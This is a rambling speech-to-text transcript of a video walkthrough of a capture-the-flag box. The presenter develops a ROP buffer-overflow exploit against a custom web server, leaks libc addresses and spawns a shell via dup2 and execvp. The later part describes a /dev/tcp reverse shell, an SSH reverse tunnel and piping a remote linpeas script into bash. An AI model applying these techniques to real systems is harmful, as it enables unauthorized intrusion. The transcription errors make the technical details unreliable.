here it's probably um triggering right here when we're calling it again but we're doing an access or no this is 404 not found let's see is there a string compare or something here four six anyways the file probably has to exist because maybe it's right around here where it does the actual buffer overflow but we have to get past this code and what's happening is we're hitting this access file name and hitting the return and saying file does not exist so that's what we have to fix now and a good way to do that is just putting a normal byte because it's going to terminate the string convert dot php will say we'll call file now payload payload uh yeah we'll do percent zero zero here so we're gonna bite here so when that access check gets convert dot php null byte it's going to stop processing but the variable's still going to have information in it so let's run this and see if it happens uh info b let's see what my break point is real quick none let's do it on the access itself access 403 ba1 403 ba1 i would have assumed it would have um the null byte and then extra information but maybe um gdb is just smart enough not to show it and it thinks it's terminated let's continue and see what happens sec fault so that was it so gdp is just terming on that null byte as well but i bet if we went in we could see it's actually handling sending everything but we see a crash right here always so the next step is to url not url encoded um create that cycle whatever redundant pattern cyclic redundant pattern or something but pattern create 512 and there's a string of characters that won't repeat so we can c to continue to crash it r p 888 and for b we can delete one let's go back into our exploit script and we can change this build request to be the pattern okay we sent it and let's see i think it's rsp we want one two three four one two three four a memory address so now we can do pattern search and at 148 is the offset we want probably maybe 149 i've always found that big endian is what we want not this but um we can try at 149 first and see if we're off by one that'd be a good thing to do so let's go back into a code and we'll say junk is equal to a times 149 and the good stuff is equal to uh we'll do b times 16 and extra is equal to c times 300. i would do b times eight okay so we'll do build request junk the good stuff and extra run p whatever control c c to get into that thread run the exploit and we can see we're off by one in rsp we want it to begin at b so it's 148. we also got md5 not match so we may have an issue there so let's see 148 and we don't need the rest we're good there so now i guess we can run like check sec on the binary uh we could probably just do it from within oh god where am i i guess i closed gdb and just didn't see it um check sec here we can see it's got uh pi which is aslr so this is just going to be a standard um rock chain type uh exploit so the very first thing we want to do is run ropper so proper is it dash dash search for pop let's look for all the rs and the file is going to be lfm server so we definitely want this one pop rdi because this can be the very first argument and there's only one rsi so we could also type rsi here and see it i think we could also do i think it's full regular expression nope but there's one rsi here and then one rdi so let's take these go into exploit let's see paste i'm just going to shorten that and the next thing we want is the rsi paste that and then we can give these variables names so pop rdi is equal to p64 0x40 5c4b that's just this number right here that's next to it and then this is going to be pop rsi r15 sequel to p64 0x405 yeah 0x405 c49 so let's see pop gadgets from rapper okay so these will be important because this is how we get arguments on to the stack i guess like in 32-bit you just put them on the stack and it pops them off the order and 64-bit you put them in registers and the first argument is rdi the second one is rsi so whenever we call the rsi gadget we have to remember to put some type of junk after it to put into the r15 register we never use it but a gadget puts it there anyway so we need it so just one note how we use this gadget so the first thing we probably want to do is have prone tools analyze our elf so we can do parental stuff and we can say e for elf is equal to elf lfm server and check sec is equal to false otherwise it's going to print a bunch of stuff that we don't want and we'll need two things probably we have to leak an address and we're dealing with a web server so the web server we're going to want to um probably leak the socket address so we can write directly to the socket so if we um run p 888 uh we probably had to set follow mode a child follow fork mode child see maybe this will do it run the exploit how good stuff is not to find god we have it open here um build request we'll just do junk plus junk and we want to set a break to somewhere so let's just set it at the url to code 403 b8d b star 0x43 b8d so when we run this we can do process info i think that's not it process status there it is and this is the network socket for us it's six if we did a bit more digging and looked at a right call we'd probably see this but this one gets created when we make this request so if we just continue let the server crash do this run thing again and do process status it's only five when we make the request that's when our thread spins up and it hits the socket so we want to write to that socket so we'll do right is equal to p64 e procedural linkage table right and what we want to do is leak the address of we know it has the socket command so we'll just uh socket so we'll just leak socket p64 e-g-o-t for the global offset table socket if you want to look at that you could just print out the e-g-o-t and see all everything in the global offset table but this is just an easy enough way so that socket and then our gadget right is going to be um [Music] gadget we'll call this leak socket so leak socket is equal to pop rdi p64 0x6 this is the very first argument to write and then we'll do leak socket pop rsi rf15 this is the thing we want to leak the second argument that's going to be plus socket plus p640 and again this one is going to be in the rsi register we don't care about this one so we just have to have it there because that's where this is and then we can finally do leak socket plus equals right uh gadget we'll just do right six comma socket that may be easier to read so let's change this junk plus leak socket and we can try this request and i think there's going to be one issue right now at least one issue um it's got that url decode and we probably have no bytes in this because of memory addresses so we're going to have to do a url decode probably leak socket is not defined leak underscore socket it is defined oh equals uh can only concentrate i hate this python3 you'll probably just have to make junk encoded dot encode and errors out randomly i'm going to add url encoding to this so this one would be payload is equal to and pen tools and python 3 the url encode option by default just doesn't seem to work i can show you url encode leak socket yeah we can do payload plus or a junk plus leak socket this can be payload run this we get this weird error i don't know how to fix this so i just didn't use the url in code and pull tools anymore instead i import url lib.purse and we can do payload is equal to um what is it url urlib dot purse dot i think it's quote um yeah quote let's do uh yeah payload url lib purse dot quote junk plus leak socket safe is equal to nothing that should work maybe url is not defined url lib press there we go so we hit the break point and oh i think we url encoded the null byte so now it shows up and i think we still crash and i don't think we got anything see cd files md5 sum convert it's saying the md5 sum is bad v exploit dot pi was that what i had to begin with d i'm get rid of these line breaks and we'll see what happens connecting error maybe back slasher let's see i'm curious if i'm just wait do i have to print read lines is that my mistake i'm gonna laugh this is it oh dash p 4 8 yep md5 not mismatch so i don't know why we're getting md5 mismatch i think it definitely has to do with putting a line break see localhost 88888 what should the md5 be run this again lfm 06 md5 not match let's look in guidra paste this ctrl shift f to follow let's look around let's see could be in three places i guess and we'll check right here trying to find words doing the md5 itself see 404 not found maybe this is md5 looking for a function call here is this doing there we go md5 in it update final return [Music] uh we can probably just break right there hold on where was that oh does not exist was it this no not match this let's rename this to md5 file and we can break point here 4 4 9 d f so rp a8 b star 0x40490f uh info b delete one see what are we returning okay convert.php see there's md5 right here so rax is the return value so let's go in my code we can just continue this to crash paste we are most certainly having the right md5 so we got something wrong with a request so check slash convert c-o-n-v-e-r-t dot php payload i'm not exactly sure what this is let's see just getting to a clean state uh we probably don't need this one okay so now i'm just going to run the server without gdb to see if that's doing anything but my main focus right now is my python script and i don't want to um side track with doing other things so if i run this we're getting the md5 not match and i think we're getting that because we're putting junk at the end of the md5 so what i want to do is vi exploit dot pi and i'm going to [Music] go here we're not going to do this the line breaks and i'm just going to run wireshark and sniff my localhost and we're going to see what the server says oh see what our client says at least uh loopback run we open the socket i'm going to laugh at something as silly as i just don't close the socket go here follow tcp stream and the server is never responding to us does he eventually doesn't look like it let's do our dot close same thing oh let's try send line hey there we go 200 okay size 32 rn this uh let's see what that er that did i bet um it just added a carriage return or backslash n to the request uh start this again continue without saving run it here we go followed tcp stream you can see after this we do have a memory address so what we're interested in is what's after this e so i'm just going to show and save as hex dump and we have a zero a after this now i don't think we had that before that's because the sent line so i think we do backslash r backslash n it's going to add one too many characters than the server is expecting it's extremely finicky so let's revert and go back to what i had so with send and let's do accessory backslash n just to see what it looks like in wireshark uh it's this one follow tcp stream and if we hex dump this zero ds0a so it's taken this zero d as the md5 sum if i had to guess it's thinking the md5 sum is 4 1 d8 whatever to 0d or 1d is what i'm guessing it begins at probably takes 32k the last 32 characters of the request and changes that way um if it looks like it only take two seconds to figure out we can so let's just do gdb lfm server and we'll break on i guess the compare after this so set follow fork mode child r-p quad 8 let's go to gydra and let's see what function are we we want to go and handle check search md5 this str compare we want so 4 3 c 6 c b star 0x 4 3 c 6 c see run what this is bizarre this is not what i expected um let's look at my payload real quick exploit yeah let's go and exploit dev b exploit dot pi yeah that's not what i expected so we're doing string compare and um all of them are identical uh let's see message two this is probably from us so let's look at hex slash s rsi x slash s rdi so yeah um our gdp is lying to us right there you can see rsi has a carriage return to it easy to miss um that was examine string what i did but yeah cause this thing's just trying to make it visibly appealing remember when the null byte kind of terminated the string for the argument it's being too smart and hid discharge return from us and that probably caused a lot of pain at least for me so let's go back to this exploit dev and we're going to just add backslash n and now that md5 sum will match but hopefully you enjoy me troubleshooting this i thought about preparing more and doing like making sure i got this exploit down correctly but i figured the troubleshooting is probably pretty beneficial for those not familiar with this let's see let's continue vi exploit so let's see i think it was four lines uh will this show us see where's wireshark do we have it follow that's just two i want to say it's four lines um let's rewire shark this stop start run continue probably crashed it that's fine one two three four and we want to go to hex okay one two three four five six seven eight one two three four five six it's odd number okay let's try this receive lines four receive one that's getting rid of that odd number uh r dot receive eight there's gonna be the leaked address so socket web c is equal to u64 to encode this as um whatever log dot success leaked socket at libc uh socket lib c okay failed probably don't need to run gdb anymore unless we gotta do more debugging that's looking good that's running that's as a um hint though we can do hex and there we go that is what we expect so now we have successfully leaked socket libc um the next step let's see well [Music] let's move this url lib stuff up into the request so we just want to put leak socket here hit capital v and then the greater than less than sign that to indent let's do uh what do we want to call this overflow i guess i don't know a good name to call this um let's just do this uh name this gadget because we're just passing the gadget into this and then we'll do um encoded gadget is equal to url lib parse dot quote and we'll just do gadget safe is equal to this and we'll do junk plus encoded gadget that's a bit cleaner string to bites line 29 link socket say dot encode let's see gadget that should be right i'm not encoding something that i need to maybe this there we go so this will be stage one let's see build request we can move this junk up here now we fine i think it's rsp there we go so now the socket is leaked stage two will be um calculate memory addresses or memory offsets we'll do stage 2 a to calculate memory offsets so in pen tools we can do lib c is equal to elf and then locate libsy.seo.6 this is our libsy and if you don't know what we're doing watch bitter man that's why i explain this the best okay and now we got to calculate the differences so we can just move this up here with pawn tool stuff and calculate differences will be we'll do the exact call exec vp libc dot symbols exec vp and we'll do socket and we can move these up as well there we go so now that we have those we can do rebase is equal to socket minus exec vp right i wish i had to move everything up now so i could see it let's see so the first one oh we should call socket something different log success socket underscore libc let's call this socket leak adr whoops where am i okay so we can do um wait a second okay i just remembered where i was going with this this was right socket exec vp so both of these are going to be the libsy addresses so we can do put libsy there and the reason why we're doing this is i'm going to find the size spacing between sock and exec vp so imagine you have like a stack i guess it's gonna be a horrible example okay imagine this is our memory stack and libsy always starts with let's say socket and then one space after is exec okay so say this is how libsy always starts what we're dealing with is aslr and it's going to randomly place where this begins but no matter where it places where it begins as long as we know where one is um we know the whole thing because libsy isn't randomizing every call within this so we can we made this a bit bigger it may make more sense we'll say we'll do a new thing and this will be so here's the thing so no matter where it begins um things are always going to be the same so if you got move the stack down here if aslr is now at this memory location well we know the difference so we can just easily calculate that no matter where this lands inside the stack we know this address we know minus three or we know stock we know if we added three we get to exact and we know where sock is so no matter where we are in the stock uh stack we're going to be able to calculate exact by just knowing the difference so that's why i'm calculating the difference of socket and exec inside our lib c because now we know the difference to get us to this exact call does hopefully that makes sense so um we can now say exec lib c odoo exec leak is equal to socket lib c or no this is socket leak save some typing socket leak minus rebase because we know this is always going to be where it is and hopefully this works the thing with buffer overflows you never know until um it works so that's what we're doing there i kind of confused myself when i was trying to organize variables but yeah uh the next thing we need is bin bash so let's create a new line we can do bin sh is equal to list libc dot search we want to look for ben sh and then a null byte which is a string terminator uh this is python 3 so let's do in code and this is returning a list so let's just grab the very first item with that zero and then i probably forgot a parenthesis there we go and we can do bin sh leak is equal to um let's see socket lib c no let's do let's just print this address my brain there's only so much i can do in a day so if i print this it'll probably make more sense so let's just do log info exec vp at libc uh hex exec vp leak uh we'll do calc and let's do the same for ben sh rename this okay so this is looking good um let's see it's the bin sh i wonder if we can just rebase this so bin sh leak is equal to [Music] um you know what i'm going to pass exact to itself and see what happens i think some magic will happen if you call exec on exec so we'll try that we'll just try exacting ourselves and see what happens i hate calculating these addresses there's a tool um i think dynalf then elf and pen tools that may be able to automatically calculate it i haven't used it in a while but yeah so let's do the first thing we have to do is duplicate our sockets i think we did this in jail it's a super old video the reason is standard in and standard out are 0 and 1 and we only have access to the file descriptor of 6 so we have to make that so we'll do stage 2b make gadget so we want to call essentially um gadget dupe six stdn which is zero uh stdn equals zero so the gadget is going to be dupe 2 c 2 p 64 e dot procedural linkage table dupe 2 and then dupe standard n is equal to pop rdi plus p64 0x6 that is this guy the first argument and then do now this is just equals standard n plus equals pop rsi r15 plus p64 0 plus p64 0. so remember standard n is zero and then we got junk to put in our 15. it doesn't matter what we put there just something has to go there and then dupe stdn plus equals dupe to now we're going to do a second gadget this is going to be std out and std out is equal to one so it's the same exact thing except the second argument is one and then we're going to have exec vp call itself so if this doesn't work then we'll have exec vp call the string bin sh so exec vp exec vp null this accidentally worked me one time and i've used it a few times since then so we'll see if it works so we'll do exec bash or do exec yeah i was gonna do like execception or something but um yeah pop rdi plus p64 uh what is the address of it exec vp underscore leak so exacting yourself exec bash pop rsi or 15 and we give it another no argument again if you're curious about the exact vp argument just look at the man page p64 exec vp leak why do we rename this to calculated no it's right there oh let's hope this works one two three four five six seven eight okay request build this is going to be all our so dupe sdn dupe std out we should rename this plus exec bash connect and this time after we send we just want to go interactive come on exec bash is not defined because the first one has to be just equals write it again uh maybe that doesn't work first let's just um run this through gdb before we make a lot of changes to see what's exactly happening so gdp will let us validate the memory addresses mainly so we'll do set follow work mode to child run p quad 8 and let's break somewhere real quick 0x uh [Music] your ld code access is fine 43ba1 or three ba1 continue and we can just run this hit the breakpoint that is fine continue and sagful these memory addresses look weird d32 uh i don't think we can access memory in that range oops follow child mode yeah that's definitely not the address of socket um we done screwed up somewhere uh going to run this server again and we're going to look at exploit let's just send this through wireshack new without saving run first request well that's weird sending the byte array we can probably fix that real quick see where is that starting um [Music] right at junk so what if we did not encode junk so it's going to crash our program it did see junk plus encoded gadget whoa decode decode well we probably don't need decode jump twice that would be silly okay that may be better let's look at that in wireshark no longer sending that b that's good where's our address we're still getting that weird address um d32 is this server sending that ever hex dump where is d32 yeah the address should begin with like 7f four six there's three two no d by it there's d i have no idea where he's getting that number from d42 not there oh let's look at the code so we got the leak wrong let's see oh i think it's lines not line it's odd that they have both of those there actually 7f that's better um so gdb lfm server continue let's set the follow fork mode to child i know you're probably getting sick of this but this is what reverse engineering is like when you don't know what you're doing um [Music] do we serve that break come on where's the break yeah i think that's what we want ba1 continue run and just make this bigger um so we should be at socket at this address x slash x uh can't access memory daniel i think that was an old one see let's look at this address okay that is socket so exec vp calculator address should be here exact vp so we got that so correct queue just look at this again real quick send the request and go interactive dude lfm server i'm guessing another 10 minutes and we'll be done with this box so now we have to get the bin sh address not a big deal so we can go up here and sh is equal to that and now we can do rebase is equal to socket lib c minus then sh i guess we can call this lib c for consistency and now we can do x uh then sh leak is equal to um this one will be then s8 uh socket leak minus rebase okay that should be good and then we can change this to be been sh leak this call is now nsh okay fog as well i'll do this type id and hey we have now successfully popped the box um well popped our own box it's not hard we started as root so now we gotta move to the remote server and it's gonna be easier than you expect if you're new to this stuff we did all the hard work so all we had to do is change localhost probably to 172 10 10 10 173 connect and we air out i remember there was a check like somewhere in this handle i know when we were debugging we kept saying 127.001 so maybe this has to come from localhost which is slightly unfortunate but not the end of the world so uh let's just enable ssh and do a reverse shell so another reverse shell of risk tunnel i'm going to do user add tunnel pass wd tunnel to be something secret that you guys don't know we're going to go etsy pass wd tunnel and we're going to change this to b false v um yeah that should be it so service ssh start ssh 10 10 14 2 we have to do tunnel hat we're going to do a reverse tunnel and this is going to be oh we have to find out the where it's connecting to so this was and i think opt checker client checker.pie grip 10 cat checker.pie where is this making uh maybe it's run file.sh 10 101. or 10 100 one so ssh dash r listen on quad eights go to ten one hundred zero one on quad eights tunnel at ten ten fourteen 2 dash n to not execute a command if we don't do this it's going to try to execute bash would execute a shell which is mapped to bin false which is going to kill a connection type in that super secret password and if we oh something bad probably happened there password the super secret password west password i just said it out loud um i think if it doesn't work for you i don't know why it's actually i'll probably have to restart ssh so what you're probably getting is this so set your config to permit password authentication and then restart ssh if you get that error message if it's saying permission denied but now type in the super secret password ss lnp t grep quad eats and we can see ssh is listening on this process the exploit.pie this can be localhost again uh python 3 run still nothing oh um it's this md5 probably so let's go back here uh where is this www.html doc md5sum convert this is the correct md5 there we go and let's see where's the connect see host is equal to 10 10 14 or 10 10 10 173 uh r it's dot here what i call it remote our host and it's down here as well first so let's see doesn't look like it worked but at least we're getting that md5 check fine let's try setting the ip to be localhost and doing the tunnel oh it's not supposed to work yet um when i was and la la land troubleshooting that one thing i forgot exactly what i was trying to do um we have to get lipsy so i didn't want it to work all i wanted to do was leak this socket so what we're going to do is go into opt and let's do uh github libsy database to google and we want to go uh not that i guess these are forks maybe yeah this is it 10 days ago it's good get clone so if you looked in the readme you could just um do the smart thing and pull the exact libc the readme set and the git commit but if you wanted to be um cool you can just do this uh this takes probably five to ten minutes to run so i'm going to pause the video once i finish explaining it so what this is doing is downloading all the libsy databases this tool knows about so we can just type hey search for socket at this address and it will go and um tell us what version of libsy it may be in and once we know that we can just point pawn tools to that version of lib c and we'll be super duper happy um out of curiosity can i run this when it's like building the database because i'm in a rush uh find socket and you only have to give it like the last six i think so we'll give it this will be fine and it may be this first [Music] 3e0 may not have the right version yet so i'm going to let this finish downloading and then we'll um do it because i don't think there's a search it's only fined yeah so i'm guessing it's just not there yet so pause the video and we'll resume once this is done downloading i'm pretty sure it's still downloading it's just started going slow so we're going to try this again and it looks like we do find it so with this tool you don't give it the full address you just give it the last few characters and i think it said that in this readme they're doing three here only the last 12 bits are checked because randomization usually works at the page size level so aslr is only really changing like these bits um yeah like this is only changing for aslr or something uh these last three are just staying the same so that's why it kind of works this way so you only need these three and we can find it's in two different locations it's either in libsy 219 ubuntu 2 i386 or this 228 amd 64. um given that this machine 64-bit i'm going to guess it's this one we can find this we do a grep and we want the dot so so opt libsy database this um yeah we can just copy it in our exploit script so where's libsy when i was trying to organize it that's why i want to put lib c at the top but it's fine right here so this will be opt libsy database db that so now when we run it it should pull all the offsets from the database we have so if i run this id we are root lsla and you can see we're actually on the server it looks like a shell doesn't last forever i can do bash maybe i type bash to load two bashes it lasts longer firewall.txt we can see uh cd slash root where is root.text oh we're not done with the box yet find slash dash name root.txt ls pwd we're an op checker server oh are we still in the docker no we're not in the docker we don't have the docker rev ifconfig yeah this is not the docker bash histories an old snap hmm let's get this shell to last a bit longer so um oh loopsie database is done downloading uh let's do c i dev tcp 10 10 14 2 9001 0 and 1 like that maybe if i run this command once we get on and get a reverse shell it won't die what i think is happening is the thread has a time to live and then the parent is killing the thread so we only have a few seconds to live but i think that just extended it so python c import pty pty spawn ben bash python c it always sucks when we make a typo on these long commands okay fg enter enter there we go so we go to root and we are in here lxd don't think that's it see cd home there's a bachelor c oh i was thinking that was bash history bash history is devno i guess we run lin p's to see if we missed anything [Music] privilege escalation awesome script suite lynn p's linps.sh girl 10 10 14 15 2 lynn psh pipe to bash that was funny i've never run the script as root it's like you're running as root it may take a while to run this i'm guessing because it can see a lot more files or something okay operating system sudo system stats oh have root with sdb1 let's see so if we do mount grab root the directory root is mounted so i wonder if we grab what is slash grip got etsy fs tab slash uid ls let's just do mount grep sda one nothing two two is mounted to slash so do mount dev sda2 uh ls slash mount mount dash o read only dev sda2 slash mount slash mount doesn't work we could probably just unmount and remount like i don't like doing that though um i can't really specify that i don't think we can mount in two different locations let's just try taking this read only flag off hey that works and let's see secret uh oh root our text is there what is secret nothing but we got root.text 33 that's 32 in a line break um what i'm guessing happened let's do sda2 um if i tried to do a read only to remount the same place uh same block device somewhere else it was incompatible but when i took off the read only it had the same mode so it let me and that's my at least what my guess is um you could also probably just unmount slash root and then when you go into root then you have it i just hate doing that because it kind of breaks it for everyone pwd yeah so if you don't revert it then it'll screw up the box so if you do mount sdb is it one or two one slash root now it's hidden it's just mounting things over top of it so that is the box hope you guys enjoyed it take care and i will see you all next week